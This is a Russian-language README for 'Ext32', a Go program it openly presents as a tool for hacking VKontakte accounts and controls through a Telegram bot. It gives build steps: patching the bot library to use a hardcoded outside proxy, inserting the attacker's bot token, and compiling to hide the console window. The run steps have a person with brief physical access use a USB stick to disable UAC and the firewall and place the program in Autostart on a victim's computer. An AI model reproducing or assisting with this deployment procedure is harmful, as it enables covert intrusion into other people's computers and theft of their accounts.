# Ext32
Ext32 - программа для взлома ВКонтакте. 

Программа написана на языке программирования Go, и использует библиотеку [tgbotapi](http://github.com/go-telegram-bot-api/telegram-bot-api).
Поэтому перед сборкой выполните 
```
go get github.com/go-telegram-bot-api/telegram-bot-api
```
<h1>Внимание!</h1>
Так как Telegram заблокирован в России, для работы программы вам необходимо внести некоторые изменения в код.

Скачав библиотеку [tgbotapi](http://github.com/go-telegram-bot-api/telegram-bot-api), откройте файл bot.go и измените следующий участок кода:
```
func NewBotAPIWithClient(token string, client *http.Client) (*BotAPI, error) {
	bot := &BotAPI{
		Token:  token,
		Client: client,
		Buffer: 100,
	}

	self, err := bot.GetMe()
	if err != nil {
		return nil, err
	}

	bot.Self = self

	return bot, nil
}
```
на
```
func NewBotAPIWithClient(token string, client *http.Client) (*BotAPI, error) {
	bot := &BotAPI{
		Token:  token,
		Client: client,
		Buffer: 100,
	}

	proxyUrl, _ := url.Parse("http://kvmde58-13429.fornex.org:8008")

	bot.Client = &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyUrl),
		},
	}

	self, err := bot.GetMe()
	if err != nil {
		return nil, err
	}

	bot.Self = self

	return bot, nil
}
```

<h1>Инструкция к сборке</h1>

* Откройте файл <b>Ext32.go</b> и в следующем блоке кода укажите собственнные данные:

```
const (
	botToken   string = "YOUR_BOT_TOKEN"
	userChatId int64  = YOUR_CHAT_ID_FROM_TELEGRAM
)
```

* Скомпилировать программу нужно со следующим флагом

```
go build Ext32.go -ldflags -H=windowsgui
```
<h1>Инструкция к запуску</h1>
* Вставьте флешку
* Запустите от имени администратора файл **Отключить UAC.bat**
* Запустите от имени администратора файл **Отключить фаервол.bat**
* Запуститие файл Copy.bat, который скопирует exe-шник в Автозагрузку
* Если возможно, перезагрузите компьютер, иначе придеться ждать пока пользователь сам перезагрузит компьюетр, ведь программа начнет работать лишь после первой перезагрузки!
* Все! Отточите навык, и вы сможете проделать весь процесс менее чем за 10 секунд
* После того, как программа запуститься сама после перезагрузки, вам в Telegram-боте придет уведомление об этом, и вы сможете управлять процессом взлома через своего бота. Удачи!
